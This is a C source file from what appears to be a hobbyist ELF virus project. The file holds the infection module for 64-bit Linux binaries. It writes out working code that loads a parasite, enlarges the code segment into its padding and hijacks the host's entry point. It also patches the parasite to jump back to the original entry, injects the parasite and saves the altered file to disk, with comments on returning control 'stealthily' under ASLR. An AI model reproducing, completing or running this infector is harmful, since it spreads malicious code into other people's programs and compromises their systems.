// Author : Abhinav Thakur
// Email  : compilepeace@gmail.com

// Description : This module contains the actual infection code


#include <stdio.h>
#include <string.h>
#include <elf.h>
#include <sys/mman.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>

#include "color.h"
#include "operations.h"



/********************  ALGORITHM   *********************


--- Load parasite from file into memory
1.	Get parasite_size and parasite_code addresss (location in allocated memory)


--- Find padding_size between CODE segment and the NEXT segment after CODE segment
2.	CODE segment : increase
		-> p_filesz 		(by parasite size)
		-> p_memsz 			(by parasite size)
	Get and Set respectively,	
	padding_size 	= (offset of next segment (after CODE segment)) - (end of CODE segment)
	parasite_offset = (end of CODE segment) or (end of last section of CODE segment)


---	PATCH Host entry point
3.	Save original_entry_point (e_entry) and replace it with parasite_offset


--- PATCH SHT
4.  Find the last section in CODE Segment and increase - 
        -> sh_size          (by parasite size)


--- PATCH Parasite offset
5.	Find and replace Parasite jmp exit addresss with original_entry_point 0x????????


---	Inject Parasite to Host @ host_mapping
6.	Inject parasite code to (host_mapping + parasite_offset)


7.	Write infection to disk x_x

*/




//  CRITICAL GLOBAL VARIABLES 


Elf64_Addr		parasite_load_address;			// parasite entry point (if parasite is LSB EXEC)
Elf64_Off		parasite_offset;				// Parasite entry point (if parasite is .so)
uint64_t		parasite_size;					
int8_t			*parasite_code;					// Parasite residence (in memory before meeting its host )

Elf64_Addr		original_entry_point;			// Host entry point
Elf64_Off		code_segment_end_offset;		// Location to inject parasite
uint64_t   		host_file_size;					// Host binary size (on disk)

unsigned int	infected_count 			= 0;	// An extern variable used in main()

int				HOST_IS_EXECUTABLE 		= 0;	// Host is LSB Executable
int 			HOST_IS_SHARED_OBJECT 	= 0;	// Host is a Shared Object


void ElfParser(char *filepath)
{

	// Mapping host_binary in memory
	void *host_mapping = mmapFile(filepath);


	// Identify the binary & SKIP Relocatable, files and 32-bit class of binaries
	Elf64_Ehdr *host_header = (Elf64_Ehdr *) host_mapping;
    if ( host_header->e_type == ET_REL ||
         host_header->e_type == ET_CORE ) return;
	else if ( host_header->e_type == ET_EXEC ){	HOST_IS_EXECUTABLE = 1; HOST_IS_SHARED_OBJECT = 0;}
	else if ( host_header->e_type == ET_DYN  ){	HOST_IS_SHARED_OBJECT = 1; HOST_IS_EXECUTABLE = 0;}
    if ( host_header->e_ident[EI_CLASS] == ELFCLASS32 ) return;

	
	// Load Parasite into memory (from disk), uses extern 'parasite_path_for_exec' defined in main.c implicitly
	if 		(HOST_IS_EXECUTABLE) 	LoadParasite(parasite_path_for_exec);
	else if (HOST_IS_SHARED_OBJECT) LoadParasite(parasite_path_for_so);


	// Get Home size (in bytes) of parasite residence in host
	// and check if host's home size can accomodate a parasite this big in size
	Elf64_Off padding_size = GetPaddingSize(host_mapping);
	if (padding_size < parasite_size)
	{
		fprintf(stderr, RED"[+]"RESET" Host "YELLOW"%s"RESET" cannot accomodate parasite, parasite is angry "RED"x_x \n"RESET, filepath); 
		return;
	}
	

	// Save original_entry_point of host and patch host entry point with parasite_offset
	original_entry_point 		= host_header->e_entry; 
	if (HOST_IS_EXECUTABLE)
		host_header->e_entry 	= parasite_load_address;
	else if (HOST_IS_SHARED_OBJECT)
		host_header->e_entry 	= parasite_offset;


	// Patch SHT
	PatchSHT(host_mapping);


	// ?????????????????????????????????????????????????????????????????????????????????????????????
	// Patch Parasite jmp-on-exit address. This step causing SIGSEGV. Since nearly all binaries are
	// in the form of shared objects (which uses offsets instead of absolute addresses), we need to
	// figure out the runtime address (rather than offset) of the first instruction the host 
	// originally intended to execute at RUNTIME. This has to be calculated by our parasite code at
	// RUNTIME since all modern systems come with mitigation called ASLR due to which the binary has
	// a different runtime address each time it is loaded into memory.
	// POSSIBLE Solution -  Parasite should include code that figures out what base address is the 
	//						binary alloted at runtime so that it transfers the code back to the host
	//						stealthily.						
	if (HOST_IS_EXECUTABLE) FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
	else if (HOST_IS_SHARED_OBJECT) {
		// Different case for SO - In case our parasite has more placeholders for so infection.
		FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
	}
		
	// ????????????????????????????????????????????????????????????????????????????????????????????


	// Inject parasite in Host
	memcpy( (host_mapping + parasite_offset), parasite_code, parasite_size);
	//DumpMemory(host_mapping + parasite_offset, parasite_size);


	// DEBUG
	fprintf(stdout, BLUE"[+]"RED"Infected x_x"RESET"  :  "GREEN"%s\n"RESET, filepath);



	// Unmaping host
	munmap(host_mapping, host_file_size);
	++infected_count;
}



// Finds the placeholder (for address where our parasite code will jump after executing its body) and
// writes the host's entry point (original entry point address) to it. This should silently transfer
// the code flow to the original intended code after the parasite body executes.
void FindAndReplace(uint8_t *parasite, long find_value, long replace_value)
{
	uint8_t *ptr = parasite;
	

	int i	= 0;
	for (i=0 ; i < parasite_size ; ++i)
	{
		long current_QWORD = *((long *)(ptr + i));
		
		if ( !(find_value ^ current_QWORD) ) 
		{
			*((long *)(ptr + i)) = replace_value;
			return;
		}
	}
}



// Patch SHT (i.e. find the last section of CODE segment and increase its size by parasite_size)
void PatchSHT(void *map_addr)
{
	Elf64_Ehdr	*elf_header 	= (Elf64_Ehdr *) map_addr;
	
	
	Elf64_Off	sht_offset 		= elf_header->e_shoff;
	uint16_t	sht_entry_size 	= elf_header->e_shentsize;
	uint16_t	sht_entry_count	= elf_header->e_shnum;
	uint64_t	sht_size		= sht_entry_count * sht_entry_size ;


    Elf64_Off 	end_offset_of_elf = (sht_offset + sht_size),
				current_section_end_offset;


    // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
    Elf64_Shdr *section_entry = (Elf64_Shdr *) (map_addr +
                                                end_offset_of_elf -
                                                sht_entry_size);

    // .shstrtab section stores all section names (NULL terminated ASCII strings, back-to-back)
    char *shstrtab_section;


    // Parse the SHT bottom->up ( i.e. from last entry(.shstrtab) upto 2nd entry (after NULL entry)) 
    // This way we'll be able to identify .text section in one parse of SHT.
    int i;
    uint16_t SECTION_FOUND = 0;
    for ( i=0 ; i < (sht_entry_count-1) ; ++i )
    {
		// Name is in the form of an index of .shstrtab section
        Elf64_Off section_name_offset = section_entry->sh_name;


        // ASSUMPTION : Last entry is always .shstrtab section header !
        // Last entry is usually .shstrtab (through which we'll indirectly get the section names)
        if (i == 0)
        {
            // section_entry->offset tells at what offset is the current section is present in binary
            shstrtab_section = (char *)(map_addr + section_entry->sh_offset);
        }


		// Find the last section of the CODE segment  
		else {

            char *current_section_name = (char *) (shstrtab_section + section_name_offset);
            current_section_end_offset = section_entry->sh_offset + section_entry->sh_size;


            if ( code_segment_end_offset == current_section_end_offset) {

                // This is the last section of CODE Segment
				// Increase the sizeof this section by a parasite_size to accomodate parasite
				SECTION_FOUND   = 1;
                section_entry->sh_size = section_entry->sh_size + parasite_size;
			} 
		}


        // Move to the next section entry
        --section_entry;
    }
}



// Returns gap size (accomodation for parasite code in padding between CODE segment and next segment 
// after CODE segment) 
Elf64_Off GetPaddingSize(void *host_mapping)
{   
	Elf64_Ehdr *elf_header 		= (Elf64_Ehdr *) host_mapping;
	uint16_t pht_entry_count 	= elf_header->e_phnum;
	Elf64_Off pht_offset 		= elf_header->e_phoff;


	// Point to first entry in PHT
	Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(host_mapping + pht_offset);


	// Parse PHT entries
	uint16_t CODE_SEGMENT_FOUND = 0;
	int i;
	for ( i = 0 ; i < pht_entry_count ; ++i)
	{
		// PF_X	(1 << 0)
		// PF_W	(1 << 1)
		// PF_R (1 << 2)
		// Find the CODE Segment (containing .text section)
		if (CODE_SEGMENT_FOUND  == 0		&&
			phdr_entry->p_type  == PT_LOAD	&&
			phdr_entry->p_flags == (PF_R | PF_X) )
		{

			CODE_SEGMENT_FOUND = 1;

			// Calculate the offset where the code segment ends to bellow calculate padding_size 
			code_segment_end_offset	= phdr_entry->p_offset + phdr_entry->p_filesz;
			parasite_offset			= code_segment_end_offset;
			parasite_load_address	= phdr_entry->p_vaddr  + phdr_entry->p_filesz;


			// Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
			phdr_entry->p_filesz = phdr_entry->p_filesz + parasite_size;
			phdr_entry->p_memsz  = phdr_entry->p_memsz  + parasite_size;
        
		}

		
		// Find next segment after CODE Segment and calculate padding size
		if (CODE_SEGMENT_FOUND  == 1		&&
			phdr_entry->p_type  == PT_LOAD	&&
			phdr_entry->p_flags == (PF_R | PF_W))
		{
			// Return padding_size (maximum size of parasite that host can accomodate in its 
			// padding between the end of CODE segment and start of next loadable segment)
			return (phdr_entry->p_offset - parasite_offset);
		}


        ++phdr_entry;	
	}

	return 0;
}



// Loads parasite code into memory and defines parasite_code and parasite_size variables
void LoadParasite(char *parasite_path)
{
	
	// Open parasite code
	int parasite_fd = open(parasite_path, O_RDONLY);
	if (parasite_fd == -1)
	{
		perror("[-] In evil_elf.c - LoadParasite(), open():");
		exit(0x60);
	}


	// Get the parasite_size using lstat() syscall
	struct stat statbuf;
	if ( lstat(parasite_path, &statbuf) != 0 )
	{
		perror("[-] In evil_elf.c - LoadParasite(), lstat():");
		exit(0x61);		
	} 


	// Initializing parasite_size and allocating space for parasite_code
	parasite_size = statbuf.st_size;
	parasite_code = (int8_t *)malloc(parasite_size);
	if (parasite_code == NULL)
	{
		fprintf(stderr, "[-] evil_elf.c, InjectParasiteCode() : Out of memory\n");
		exit(0x61);
	}


	// Load actual poison @ parasite_code (allocated memory on heap)
	int bytes_read = read(parasite_fd, parasite_code, parasite_size);
	if (bytes_read == -1)
	{
		perror(RED"[-]"RESET" In evil_elf.c, LoadParasite() - read():");
		exit(0x62);
	}
}



// Opening and Mapping file in memory
void *mmapFile(char *file)
{

	// Open the file
    int fd = open(file, O_RDWR);
        if (fd == -1) {
            perror(RED"[-]"RESET"evil_elf.c - mmapFile() - open():");
            exit(0x60);
        }


    // Get the host_file_size using lstat()
    struct stat statbuf;
        if (lstat(file, &statbuf) != 0) {
            perror(RED"[-]"RESET"elf.c - Infect(), lstat():");
            exit(0x61);
        }
        host_file_size = statbuf.st_size;
		

    // Map the file into memory for instrumentation.
    // NOTE: If mapping is MAP_SHARED mmap will perform COPY-ON-WRITE to fd.
    //       else if mapping is MAP_PRIVATE, no COPY-ON-WRITE will be performed. 
    void *map_address = mmap(NULL, host_file_size, PROT_WRITE, MAP_SHARED, fd, 0);
        if (map_address == MAP_FAILED) {
            perror("evil_elf.c - Infect(), mmap():");
            exit(0x62);
        }

	close(fd);
	return map_address;
}



// Helper function : Dump memory region
void DumpMemory(void *address, uint64_t size)
{	
	uint8_t		*iterator = address;
	uint64_t	i;

	for (i=0; i<size; ++i)
	{
		fprintf(stdout, YELLOW"%02x "RESET, *(iterator + i));
	}
}
